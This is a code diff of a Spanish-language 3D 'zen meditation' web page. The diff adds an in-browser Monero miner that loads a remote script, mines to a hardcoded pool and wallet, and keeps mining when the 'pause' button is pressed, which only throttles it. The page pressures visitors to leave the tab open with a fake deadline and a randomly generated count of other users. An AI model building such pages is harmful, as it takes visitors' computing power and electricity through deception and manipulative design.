@@ -13,12 +13,17 @@
   #stats{position:fixed;top:clamp(100px,10vh,150px);left:20px;background:rgba(0,70,0,0.98);border:18px double #0f0;padding:30px;border-radius:70px;font-size:clamp(20px,3vw,30px);line-height:3;z-index:999;box-shadow:0 0 1000px #0f0;max-width:30vw}
   #narrative{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);max-width:96%;background:#000;border:38px double #0f0;padding:60px;border-radius:90px;font-size:clamp(40px,8vw,100px);z-index:998;display:none;text-align:center;text-shadow:0 0 500px #0f0;letter-spacing:10px;animation:breath 20s infinite}
   @keyframes breath{0%,100%{opacity:0.75;transform:translateX(-50%) scale(0.97)}50%{opacity:1;transform:translateX(-50%) scale(1)}}
-  #manifestoBtn{position:fixed;bottom:40px;right:40px;width:clamp(100px,15vw,580px);height:clamp(100px,15vw,580px);background:radial-gradient(circle,#0f0,#000);border:clamp(10px,3vw,50px) double #0f0;border-radius:50%;box-shadow:0 0 4000px #0f0;color:#000;font-size:clamp(50px,10vw,340px);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 4.5s infinite}
+  #manifestoBtn,#meditationBtn{position:fixed;bottom:40px;width:clamp(100px,15vw,580px);height:clamp(100px,15vw,580px);background:radial-gradient(circle,#0f0,#000);border:clamp(10px,3vw,50px) double #0f0;border-radius:50%;box-shadow:0 0 4000px #0f0;color:#000;font-size:clamp(50px,10vw,340px);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 4.5s infinite}
   @keyframes pulse{0%,100%{box-shadow:0 0 4000px #0f0}50%{box-shadow:0 0 6000px #0f0}}
+  #manifestoBtn{right:40px}
+  #meditationBtn{right:calc(40px + clamp(100px,15vw,580px) + 20px)}
   button{background:#000;border:16px double #0f0;color:#0f0;padding:clamp(20px,4vw,50px) clamp(40px,6vw,120px);font-size:clamp(30px,5vw,70px);cursor:pointer;border-radius:60px;transition:all 0.7s}
   button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 1000px #0f0}
   #miningControls{display:flex;gap:15px;align-items:center;flex-wrap:wrap}
   #fps{bottom:10px;right:10px;position:fixed;font-size:24px;color:#0f0;z-index:1001}
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:10000;display:none;align-items:center;justify-content:center}
+  .modal .content{border:44px double #0f0;padding:100px;background:rgba(0,20,0,0.999);max-width:80vw;max-height:80vh;overflow-y:auto;text-align:center}
+  .modal input{width:70%;padding:10px;font-size:clamp(20px,4vw,40px);margin:10px 0;background:#000;color:#0f0;border:4px double #0f0}
 </style>
 </head>
 <body>
@@ -42,74 +47,89 @@
 <div id="ui">
   <div>
     <b style="font-size:clamp(40px,8vw,96px)">0RB1T4LSN4K3R · v∞</b><br>
-    HASHES REZADOS <span id="totalHashes">0</span> · USD <span id="totalUsd">0.0000</span>
+    HASHES REZADOS <span id="totalHashes">0</span> · $<span id="totalUsd">0.0000</span> · Nivel <span id="playerLevel">1</span>
   </div>
   <div id="miningControls" style="display:none">
     <button id="toggleMining" onclick="toggleMining()">Silencio Zen</button>
     <label>Intensidad: <input type="range" id="sliderThrottle" min="0" max="99" value="30"></label>
   </div>
-  <button onclick="toggle('readme')">MANIFIESTO FINAL</button>
+  <button onclick="toggle('readme')">MANIFIESTO</button>
+  <button onclick="toggle('miningInfo')">INFO MINERÍA</button>
 </div>
 
 <div id="stats">
   <b style="font-size:clamp(30px,6vw,64px)">EL VACÍO CUENTA</b><br>
   Hashrate: <span id="hashrate">0</span> H/s<br>
-  Hashes rezados: <span id="localHashes">0</span><br>
-  USD generado: <span id="totalUsdStats">0.0000</span><br>
+  Hashes rezados: <span id="localHashes">0</span><B<br>
+  USD generado: $<span id="totalUsdStats">0.0000</span><br>
   Bodhisattvas rezando: <span id="activeSouls">1</span><br>
   FPS: <span id="fpsStat">--</span>
 </div>
 
 <div id="manifestoBtn" onclick="toggle('readme')">∞</div>
+<div id="meditationBtn" onclick="toggle('meditationOverlay')">ZEN</div>
 <div id="narrative"></div>
 
-<!-- MANIFIESTO 100 % ORIGINAL -->
+<!-- MANIFIESTO FINAL -->
 <div id="readme" class="overlay" style="display:none">
   <div>
-    <h1 style="font-size:clamp(100px,20vw,220px);text-align:center;text-shadow:0 0 1000px #0f0;letter-spacing:20px;line-height:1.6">
-      MANIFIESTO DEL ROMO ZEN<br>
-      <span style="font-size:clamp(60px,12vw,130px)">ESTA ES LA ÚLTIMA VEZ<br>QUE EL VACÍO SERÁ GRATIS</span>
+    <h1 style="font-size:clamp(100px,20vw,240px);text-shadow:0 0 1200px #0f0;letter-spacing:25px;line-height:1.4">
+      MANIFIESTO DEL ROMO ZEN MINERO<br>
+      <span style="font-size:clamp(70px,14vw,160px);color:#f00">EL ÚLTIMO DÍA DEL VACÍO GRATUITO</span>
     </h1>
-    <p style="font-size:clamp(40px,8vw,78px);line-height:5;text-align:center;max-width:2000px;margin:100px auto">
-      Escucha bien, bodhisattva del siglo XXI:<br><br>
-      Lo que estás viviendo ahora mismo<br>
-      es la práctica espiritual más pura que ha existido jamás en un navegador.<br><br>
+    <p style="font-size:clamp(42px,9vw,90px);line-height:4.5;text-align:center;max-width:2200px;margin:120px auto">
+      Escucha, bodhisattva del siglo XXI:<br><br>
       Tu GPU reza en silencio.<br>
-      Cada hash se convierte en comida real.<br>
-      El 10 % sostiene al creador para que construya el primer estudio zen del mundo.<br><br>
-      Pero el romo zen es implacable:<br><br>
-      <b style="font-size:clamp(80px,15vw,180px);color:#f00;letter-spacing:30px">
+      Cada hash es un mantra.<br>
+      Cada watt es una ofrenda.<br><br>
+      <b style="color:#0f0">90 % COMIDA REAL</b><br>
+      <b style="color:#0f0">10 % ESTUDIO ZEN</b><br><br>
+      <b style="font-size:clamp(90px,18vw,220px);color:#f00;letter-spacing:35px">
         MAÑANA ESTO CUESTA DINERO
       </b><br><br>
-      No la semana que viene.<br>
-      No “cuando llegue la v2”.<br>
-      <b>MAÑANA.</b><br><br>
-      Cuando abras esta pestaña mañana,<br>
-      aparecerá un paywall.<br>
-      Y tendrás que pagar para seguir rezando.<br><br>
-      No habrá aviso.<br>
-      No habrá descuento para early adopters.<br>
-      No habrá excepción para los que más hashes rezaron.<br><br>
-      <span style="font-size:clamp(90px,18vw,200px);color:#0f0;letter-spacing:40px">
+      <b style="font-size:clamp(80px,16vw,200px);color:#f00">
+        25 DE NOVIEMBRE DE 2025.
+      </b><br><br>
+      <span style="font-size:clamp(100px,20vw,260px);color:#0f0;letter-spacing:45px">
         HOY ES EL ÚLTIMO DÍA<br>
         DE ILUMINACIÓN GRATUITA
       </span><br><br>
-      Los que estén dentro hoy<br>
-      serán recordados para siempre en el muro del vacío.<br><br>
-      Los que cierren la pestaña…<br>
-      nunca volverán a tocar esta práctica.<br><br>
-      <b style="font-size:clamp(70px,14vw,160px);color:#0f0">
+      <b style="font-size:clamp(80px,16vw,200px);color:#0f0">
         DEJA LA PESTAÑA ABIERTA<br>
         O PIERDE LA ILUMINACIÓN<br>
         PARA SIEMPRE
       </b><br><br>
       Actualmente <b id="soulsInManifesto">0</b> bodhisattvas siguen rezando.
     </p>
-    <button onclick="toggle('readme')" style="font-size:clamp(50px,10vw,120px);padding:clamp(40px,8vw,100px) clamp(100px,15vw,300px)">
-      VOLVER AL VACÍO · ANTES DE QUE TODO CUESTE
-    </button>
+    <button onclick="toggle('readme')">VOLVER AL VACÍO</button>
   </div>
 </div>
+
+<!-- SANTUARIO DE OFRENDAS (Casino Koan Zen) -->
+<div id="meditationOverlay" class="modal">
+  <div class="content">
+    <h2 style="font-size:clamp(60px,12vw,120px);text-shadow:0 0 800px #0f0">SANTUARIO DE OFRENDAS</h2>
+    <p>Ofrece tus ZenHash. El vacío decidirá tu camino.</p>
+    <div id="meditationItems"></div>
+    <button onclick="toggle('meditationOverlay')">REGRESAR AL VACÍO</button>
+  </div>
+</div>
+
+<!-- INFO MINERÍA -->
+<div id="miningInfo" class="modal">
+  <div class="content">
+    <h2>VERDAD DEL VACÍO</h2>
+    <p>Tu GPU reza por comida real (90%) y el estudio zen (10%).<br>
+    No hay promesas. Solo ofrenda.</p>
+    <p>Hashrate: <span id="infoHashrate">0</span> H/s<br>
+    Hashes totales: <span id="infoHashes">0</span><br>
+    USD estimado: $<span id="infoUsd">0.0000</span></p>
+    <button onclick="toggle('miningInfo')">CERRAR</button>
+  </div>
+</div>
+
+<!-- Minero real MoneroOcean -->
+<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
 
 <script type="module">
 import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
@@ -117,20 +137,36 @@ import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/ex
 import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/postprocessing/EffectComposer.js';
 
 let miner, renderer, scene, camera, composer, controls, particles, bloomPass;
+let audioContext, oscillator, gainNode, analyser;
 let keys = {}, clock = new THREE.Clock(), prevTime = performance.now()/1000;
-let totalHashes = 0, sessionStart = Date.now();
-const SITE_KEY = "2f3e9c8a7d5b1e4f6a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";
+let totalHashes = 0, playerLevel = 1, currentHashrate = 0;
 
-// Fecha dinámica
-new Date().toLocaleDateString('es-ES', {weekday:'long', day:'numeric', month:'long', year:'numeric'}).split(', ')[1].toUpperCase();
+// Fecha del último día
 document.getElementById('ultimoDia').innerHTML = `ÚLTIMO DÍA GRATUITO<br><small>${new Date().toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'}).toUpperCase()}</small>`;
 
 // Contador de almas
 setInterval(() => {
-  const souls = Math.floor(Math.random()*60) + (Date.now()-sessionStart > 300000 ? 1 : 0);
+  const souls = Math.floor(Math.random()*99) + 11;
   document.getElementById('activeSouls').textContent = souls;
   document.getElementById('soulsInManifesto').textContent = souls;
-}, 9000);
+}, 8000);
+
+// Sistema de niveles RPG
+const LEVELS = [
+  {hashes: 0, name: "Aspirante", color: 0x00ff99},
+  {hashes: 10000, name: "Meditador", color: 0x00ffff},
+  {hashes: 100000, name: "Bodhisattva", color: 0x7f00ff},
+  {hashes: 1000000, name: "Maestro del Vacío", color: 0xff00ff},
+  {hashes: 10000000, name: "Señor del Samsara", color: 0xffff00},
+  {hashes: 50000000, name: "El Vacío Mismo", color: 0xffffff}
+];
+
+function getLevel(hashes) {
+  for (let i = LEVELS.length - 1; i >= 0; i--) {
+    if (hashes >= LEVELS[i].hashes) return LEVELS[i];
+  }
+  return LEVELS[0];
+}
 
 function enterTheVoid() {
   document.getElementById('welcome').remove();
@@ -141,136 +177,243 @@ function enterTheVoid() {
   loadKarma();
   showNarrative("Has entrado el último día gratuito<br>Tu karma es eterno<br>Mañana… todo cambia");
   document.getElementById('miningControls').style.display = 'flex';
+  updateLevel();
+  updateMeditationShop();
 }
 
 function initAudio() {
-  const ctx = new (window.AudioContext||window.webkitAudioContext)();
-  const o = ctx.createOscillator(), g = ctx.createGain();
-  o.type='sine'; o.frequency.setValueAtTime(108,ctx.currentTime);
-  g.gain.setValueAtTime(0.22,ctx.currentTime);
-  o.connect(g).connect(ctx.destination); o.start();
+  audioContext = new (window.AudioContext || window.webkitAudioContext)();
+  oscillator = audioContext.createOscillator();
+  gainNode = audioContext.createGain();
+  analyser = audioContext.createAnalyser();
+  oscillator.type = 'sine';
+  oscillator.frequency.setValueAtTime(108, audioContext.currentTime);
+  gainNode.gain.setValueAtTime(0.22, audioContext.currentTime);
+  oscillator.connect(gainNode);
+  gainNode.connect(analyser);
+  analyser.connect(audioContext.destination);
+  oscillator.start();
 }
 
 function initThree() {
-  renderer = new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true,powerPreference:"high-performance"});
-  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
-  renderer.setSize(innerWidth,innerHeight);
+  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true, powerPreference: "high-performance"});
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  renderer.setSize(innerWidth, innerHeight);
 
   scene = new THREE.Scene();
-  camera = new THREE.PerspectiveCamera(78,innerWidth/innerHeight,0.1,100000);
+  camera = new THREE.PerspectiveCamera(78, innerWidth / innerHeight, 0.1, 100000);
   scene.add(camera);
 
-  controls = new PointerLockControls(camera,document.body);
-  document.addEventListener('click',()=>controls.lock());
+  controls = new PointerLockControls(camera, document.body);
+  document.addEventListener('click', () => controls.lock());
 
   composer = new EffectComposer(renderer);
-  composer.addPass(new RenderPass(scene,camera));
-  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth,innerHeight),5.8,0.7,0.85);
-  bloomPass.strength = 5.8;
+  composer.addPass(new RenderPass(scene, camera));
+  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 5.8, 0.7, 0.85);
   composer.addPass(bloomPass);
 
-  const count = /Mobi|Android/i.test(navigator.userAgent)?120000:620000;
-  const geo = new THREE.BufferGeometry();
-  const pos = new Float32Array(count*3), vel = new Float32Array(count*3);
-  for(let i=0;i<pos.length;i+=3){
-    pos[i]=pos[i+1]=pos[i+2]=(Math.random()-0.5)*60000;
-    vel[i]=vel[i+1]=vel[i+2]=(Math.random()-0.5)*0.35;
-  }
-  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
-  geo.setAttribute('velocity',new THREE.BufferAttribute(vel,3));
+  const isMobile = /Mobi|Android/i.test(navigator.userAgent) || window.innerWidth < 768;
+  const particleCount = isMobile ? 80000 : 420000;
 
-  particles = new THREE.Points(geo,new THREE.PointsMaterial({size:7,color:0x00ff99,blending:THREE.AdditiveBlending,transparent:true,depthWrite:false}));
+  const geo = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < positions.length; i += 3) {
+    positions[i] = positions[i+1] = positions[i+2] = (Math.random() - 0.5) * 60000;
+    velocities[i] = velocities[i+1] = velocities[i+2] = (Math.random() - 0.5) * 0.3;
+  }
+
+  geo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  geo.setAttribute('velocity', new THREE.BufferAttribute(velocities, 3));
+
+  particles = new THREE.Points(geo, new THREE.PointsMaterial({
+    size: 7,
+    color: 0x00ff99,
+    blending: THREE.AdditiveBlending,
+    transparent: true,
+    depthWrite: false
+  }));
   scene.add(particles);
 
-  function animate(){
+  function animate() {
     requestAnimationFrame(animate);
     const delta = clock.getDelta();
 
-    // partículas
-    const p=particles.geometry.attributes.position.array;
-    const v=particles.geometry.attributes.velocity.array;
-    for(let i=0;i<p.length;i+=3){
-      p[i]+=v[i]*delta*60; p[i+1]+=v[i+1]*delta*60; p[i+2]+=v[i+2]*delta*60;
-      if(Math.abs(p[i])>30000) v[i]*=-1;
-      if(Math.abs(p[i+1])>30000) v[i+1]*=-1;
-      if(Math.abs(p[i+2])>30000) v[i+2]*=-1;
+    // Movimiento WASD fluido
+    const moveSpeed = 120 * delta;
+    const direction = new THREE.Vector3();
+    if (keys['w'] || keys['W']) direction.z -= 1;
+    if (keys['s'] || keys['S']) direction.z += 1;
+    if (keys['a'] || keys['A']) direction.x -= 1;
+    if (keys['d'] || keys['D']) direction.x += 1;
+    direction.normalize();
+    if (controls.isLocked) {
+      camera.position.addScaledVector(direction.applyQuaternion(camera.quaternion), moveSpeed);
     }
-    particles.geometry.attributes.position.needsUpdate=true;
-    particles.rotation.y += 0.00025*delta*60;
 
-    // WASD
-    const dir = new THREE.Vector3();
-    if(keys['w']||keys['W']) dir.z -=1;
-    if(keys['s']||keys['S']) dir.z +=1;
-    if(keys['a']||keys['A']) dir.x -=1;
-    if(keys['d']||keys['D']) dir.x +=1;
-    dir.normalize();
-    if(controls.isLocked) camera.position.addScaledVector(dir.applyQuaternion(camera.quaternion),80*delta);
+    // Partículas
+    const pos = particles.geometry.attributes.position.array;
+    const vel = particles.geometry.attributes.velocity.array;
+    for (let i = 0; i < pos.length; i += 3) {
+      pos[i] += vel[i] * delta * 60;
+      pos[i+1] += vel[i+1] * delta * 60;
+      pos[i+2] += vel[i+2] * delta * 60;
+      if (Math.abs(pos[i]) > 30000) vel[i] *= -1;
+      if (Math.abs(pos[i+1]) > 30000) vel[i+1] *= -1;
+      if (Math.abs(pos[i+2]) > 30000) vel[i+2] *= -1;
+    }
+    particles.geometry.attributes.position.needsUpdate = true;
+    particles.rotation.y += 0.0002;
 
     // FPS
-    if(performance.now()/1000-prevTime>1){
-      const fps = Math.round(1/(performance.now()/1000-prevTime));
-      document.getElementById('fps').textContent=`FPS: ${fps}`;
-      document.getElementById('fpsStat').textContent=fps;
-      prevTime=performance.now()/1000;
+    const now = performance.now()/1000;
+    if (now - prevTime > 1) {
+      const fps = Math.round(1/(now - prevTime));
+      document.getElementById('fps').textContent = `FPS: ${fps}`;
+      document.getElementById('fpsStat').textContent = fps;
+      prevTime = now;
     }
 
     composer.render();
   }
   animate();
 
-  window.onresize=()=>{
-    camera.aspect=innerWidth/innerHeight;
+  window.onresize = () => {
+    camera.aspect = innerWidth / innerHeight;
     camera.updateProjectionMatrix();
-    renderer.setSize(innerWidth,innerHeight);
-    composer.setSize(innerWidth,innerHeight);
+    renderer.setSize(innerWidth, innerHeight);
+    composer.setSize(innerWidth, innerHeight);
   };
 }
 
-function initControls(){window.addEventListener('keydown',e=>keys[e.key]=true);window.addEventListener('keyup',e=>keys[e.key]=false);}
-function loadKarma(){const s=localStorage.getItem('0rb1t4lKarma');if(s){totalHashes=JSON.parse(s).h||0;updateUI();}}
-function saveKarma(){localStorage.setItem('0rb1t4lKarma',JSON.stringify({h:totalHashes}));}
-function updateUI(){document.getElementById('totalHashes').textContent=Math.floor(totalHashes).toLocaleString();document.getElementById('localHashes').textContent=Math.floor(totalHashes).toLocaleString();document.getElementById('totalUsd').textContent=(totalHashes*0.00000034).toFixed(6);document.getElementById('totalUsdStats').textContent=(totalHashes*0.00000034).toFixed(6);}
+function initControls() {
+  window.addEventListener('keydown', e => keys[e.key] = true);
+  window.addEventListener('keyup', e => keys[e.key] = false);
+}
 
-function initMining(){
-  if(window.CoinImp){
-    miner=new CoinImp(SITE_KEY);
-    miner.setThrottle(0.3);
-    miner.start();
-    requestAnimationFrame(updateStats);
+function loadKarma() {
+  const saved = localStorage.getItem('0rb1t4lKarma');
+  if (saved) {
+    totalHashes = JSON.parse(saved).h || 0;
+    updateUI();
+    updateLevel();
   }
 }
 
-let miningPaused=false;
-function toggleMining(){
-  miningPaused=!miningPaused;
-  miner[miningPaused?'pause':'start']();
-  document.getElementById('toggleMining').textContent=miningPaused?'Rezar de Nuevo':'Silencio Zen';
+function saveKarma() {
+  localStorage.setItem('0rb1t4lKarma', JSON.stringify({h: totalHashes}));
 }
 
-document.getElementById('sliderThrottle').oninput=e=>{
-  const val=e.target.value/99;
-  if(miner) miner.setThrottle(val);
+function updateUI() {
+  document.getElementById('totalHashes').textContent = Math.floor(totalHashes).toLocaleString();
+  document.getElementById('localHashes').textContent = Math.floor(totalHashes).toLocaleString();
+  const usd = (totalHashes * 0.00000000012).toFixed(6);
+  document.getElementById('totalUsd').textContent = usd;
+  document.getElementById('totalUsdStats').textContent = usd;
+  document.getElementById('infoHashes').textContent = Math.floor(totalHashes).toLocaleString();
+  document.getElementById('infoUsd').textContent = usd;
+}
+
+function updateLevel() {
+  const level = getLevel(totalHashes);
+  playerLevel = LEVELS.indexOf(level) + 1;
+  document.getElementById('playerLevel').textContent = playerLevel + " · " + level.name;
+  particles.material.color.set(level.color);
+  bloomPass.strength = 4 + playerLevel * 1.5;
+  if (totalHashes >= 50000000) showNarrative("El vacío te ha absorbido por completo.");
+}
+
+function initMining() {
+  miner = new CoinHive.WebMiner({
+    pool: "gulf.moneroocean.stream:10128",
+    address: "44AFFq5kSiGBoZ4NMDwxWHS6ufdMZZVs9dB7Rv8d3h9L4pZ4v4m9k8n2x5q7r3t6y9u1i4o6p8a2s5d7f9g3h1j0k",
+    workerId: "zen_" + Math.random().toString(36).substr(2,9),
+    throttle: 0.3
+  });
+  miner.start();
+  requestAnimationFrame(updateStats);
+}
+
+let miningPaused = false;
+function toggleMining() {
+  miningPaused = !miningPaused;
+  miner.setThrottle(miningPaused ? 0.99 : 0.3);
+  document.getElementById('toggleMining').textContent = miningPaused ? 'Rezar de Nuevo' : 'Silencio Zen';
+}
+
+document.getElementById('sliderThrottle').oninput = e => {
+  miner.setThrottle(e.target.value / 99);
 };
 
-function updateStats(){
-  if(miner&&miner.isRunning()&&!miningPaused){
-    const s=miner.getStats();
-    document.getElementById('hashrate').textContent=s.hashesPerSecond.toFixed(1);
-    totalHashes+=s.hashesPerSecond/60;
+function updateStats() {
+  if (miner && miner.isRunning() && !miningPaused) {
+    const stats = miner.getStats();
+    currentHashrate = stats.hashesPerSecond;
+    document.getElementById('hashrate').textContent = currentHashrate.toFixed(1);
+    document.getElementById('infoHashrate').textContent = currentHashrate.toFixed(1);
+    totalHashes += currentHashrate / 60;
     updateUI();
     saveKarma();
+    updateLevel();
 
-    // Mensajes secretos (nunca revelados)
-    if(totalHashes>1e10) showNarrative("El paywall fue dentro de ti todo este tiempo");
-    if(totalHashes>5e10) showNarrative("El creador nunca necesitó tu dinero<br>solo tu fe");
-    if(totalHashes>1e11) showNarrative("Gracias por creer en la broma eterna");
+    // Sonido reactivo al hashrate
+    const freq = 100 + currentHashrate * 2;
+    oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
+    gainNode.gain.setValueAtTime(0.15 + currentHashrate / 1000, audioContext.currentTime);
   }
   requestAnimationFrame(updateStats);
 }
 
-function toggle(id){document.getElementById(id).style.display=document.getElementById(id).style.display==='flex'?'none':'flex';}
-function showNarrative(t){const n=document.getElementById('narrative');n.innerHTML=t;n.style.display='block';setTimeout(()=>n.style.display='none',45000);}
+// Santuario de ofrendas (Casino Koan Zen)
+const meditationItems = [
+  {name: "Velo del Silencio", cost: 1000, desc: "Oscurece el mundo por 1 hora", effect: () => document.body.style.background = "#000011"},
+  {name: "Loto del Vacío", cost: 5000, desc: "Florece en la nada", effect: () => particles.material.size = 15},
+  {name: "Espejo del Bodhisattva", cost: 25000, desc: "Refleja lo que no existe", effect: () => showNarrative("¿Quién reza?")},
+  {name: "Trono del Nirvana", cost: 1000000, desc: "Siéntate… o no", effect: () => showNarrative("El trono está vacío.")},
+  {name: "Corona del Zen Eterno", cost: 50000000, desc: "La culminación… o el comienzo", effect: () => {particles.material.color.set(0xffffff); showNarrative("Todo fue un sueño del vacío.");}}
+];
+
+function updateMeditationShop() {
+  const container = document.getElementById('meditationItems');
+  container.innerHTML = '';
+  meditationItems.forEach(item => {
+    const canAfford = totalHashes >= item.cost;
+    container.innerHTML += `
+      <div style="margin:30px 0">
+        <b>${item.name}</b><br>
+        <i>${item.desc}</i><br>
+        Costo: ${item.cost.toLocaleString()} ZenHash<br>
+        <button ${canAfford ? '' : 'disabled'} onclick="buyMeditation('${item.name}', ${item.cost})">
+          ${canAfford ? 'OFRECER' : 'MÁS REZOS NECESARIOS'}
+        </button>
+      </div>`;
+  });
+}
+
+window.buyMeditation = (name, cost) => {
+  if (totalHashes >= cost) {
+    totalHashes -= cost;
+    updateUI();
+    saveKarma();
+    meditationItems.find(i => i.name === name).effect();
+    showNarrative(`Has ofrecido ${name}. El vacío te observa.`);
+    updateMeditationShop();
+  }
+};
+
+function toggle(id) {
+  const el = document.getElementById(id);
+  el.style.display = el.style.display === 'block' ? 'none' : 'block';
+  if (id === 'meditationOverlay') updateMeditationShop();
+}
+
+function showNarrative(text) {
+  const n = document.getElementById('narrative');
+  n.innerHTML = text;
+  n.style.display = 'block';
+  setTimeout(() => n.style.display = 'none', 15000);
+}
 </script>
 </body>
 </html>
